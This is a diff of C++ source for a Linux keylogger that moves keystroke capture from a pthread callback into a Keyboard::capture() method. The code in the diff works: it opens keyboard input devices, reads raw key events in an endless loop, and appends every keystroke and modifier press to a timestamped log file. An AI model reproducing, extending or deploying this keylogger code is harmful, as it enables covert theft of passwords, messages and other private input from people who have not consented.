@@ -3,6 +3,7 @@
 #include <fstream>
 #include <regex>
 #include <vector>
+#include <future>
 #include <cstdlib>
 #include <ctime>
 #include <iomanip>
@@ -10,7 +11,6 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <dirent.h>
-#include <pthread.h>
 #include <linux/input.h>
 #include <linux/version.h>
 #include <sys/ioctl.h>
@@ -36,25 +36,57 @@ class Keyboard {
             deviceFile = -1;
         }
 
-        ~Keyboard() {
-            close(deviceFile);
-        }
+        ~Keyboard() { close(deviceFile); }
 
         void openDeviceFile() {
             deviceFile = open(devicePath.c_str(), O_RDONLY);
         }
 
-        pthread_t getCaptureThread() {
-            return _captureThread;
-        }
-
-        void capture() {
-            pthread_create(&_captureThread, nullptr, _startCapture, (void *)this);
-        }
-
-    private:
-        pthread_t _captureThread;
+        void capture();
 };
+
+void Keyboard::capture() {
+    int readEvent, eventType;
+    struct input_event keyEvent[64];
+    const char* output;
+
+    // Open log file and keyboard device file
+    std::ofstream logFileStream (captureLog, std::ios::app);
+    openDeviceFile();
+
+    if (deviceFile > 0) {
+
+        // Write timestamp
+        std::time_t time = std::time(nullptr);
+        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
+            << "-------------------------------------\n";
+
+        // Capture keystrokes
+        while(true) {
+            readEvent = read(deviceFile, keyEvent, sizeof(struct input_event) * 64);
+
+            if(readEvent > 0) {
+                eventType = keyEvent[1].value;
+                output = keys[keyEvent[1].code];
+                /* Record press and release for
+                   modifier keys (shift, ctrl, and super) */
+                if(eventType != 2 && (
+                            std::strncmp(output, "<su", 3) == 0
+                            || std::strncmp(output, "<l-", 3) == 0
+                            || std::strncmp(output, "<r-", 3) == 0
+                            )
+                  ) {
+                    DEBUG_STDOUT(output + (" " + std::to_string(eventType)));
+                    logFileStream << output << " " << keyEvent[1].value << std::endl;
+                }
+                else if(eventType != 0) {
+                    logFileStream << output << std::endl;
+                    DEBUG_STDOUT(output);
+                }
+            }
+        }
+    }
+}
 
 std::vector<Keyboard> findKeyboards() {
     struct dirent **nameList;
@@ -92,51 +124,4 @@ std::vector<Keyboard> findKeyboards() {
     if(not keyboards.size()) DEBUG_STDERR("No keyboards found.");
 
     return keyboards;
-}
-
-static void* _startCapture(void* threadData) {
-    int readEvent, eventType;
-    struct input_event keyEvent[64];
-    const char* output;
-
-    // Retrieve and cast Keyboard instance from threadData
-    Keyboard* keyboard = (Keyboard *) threadData;
-
-    // Open log file and keyboard device file
-    std::ofstream logFileStream (keyboard->captureLog, std::ios::app);
-    keyboard->openDeviceFile();
-
-    if (keyboard->deviceFile > 0) {
-        // Write timestamp
-        std::time_t time = std::time(nullptr);
-        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
-            << "-------------------------------------\n";
-
-        // Capture keystrokes
-        while(true) {
-            readEvent = read(keyboard->deviceFile, keyEvent, sizeof(struct input_event) * 64);
-
-            if(readEvent > 0) {
-                eventType = keyEvent[1].value;
-                output = keys[keyEvent[1].code];
-                /* Record press and release for
-                   modifier keys (shift, ctrl, and super) */
-                if(eventType != 2 && (
-                            std::strncmp(output, "<su", 3) == 0
-                            || std::strncmp(output, "<l-", 3) == 0
-                            || std::strncmp(output, "<r-", 3) == 0
-                            )
-                  ) {
-                    DEBUG_STDOUT(output + (" " + std::to_string(eventType)));
-                    logFileStream << output << " " << keyEvent[1].value << std::endl;
-                }
-                else if(eventType != 0) {
-                    logFileStream << output << std::endl;
-                    DEBUG_STDOUT(output);
-                }
-            }
-        }
-
-        pthread_exit(nullptr);
-    }
 }
